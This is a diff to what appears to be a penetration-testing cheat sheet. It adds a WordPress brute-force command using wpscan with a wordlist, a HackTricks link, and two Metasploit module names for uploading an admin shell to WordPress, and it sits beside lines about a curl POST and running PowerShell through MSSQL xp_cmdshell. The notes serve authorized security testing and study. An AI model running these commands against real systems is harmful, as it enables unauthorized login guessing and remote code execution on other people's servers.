@@ -475,8 +475,17 @@ curl -H "Content-Length:0" -X POST https://<domain>/restricted_file
 ```
 
 ### BruteForcing Wordpress
+https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress
+
 ```
 wpscan -U <username> -P wordlist.txt --url http://url/wordpress
+```
+
+### pentesting wordpress
+
+```
+use exploit/unix/webapp/wp_admin_shell_upload
+use exploit/unix/webapp/wp_slideshowgallery_upload
 ```
 
 ### Using xp_cmdshell to run a powershell script on MSSQL (thanks to @sinfulz for recommending this)
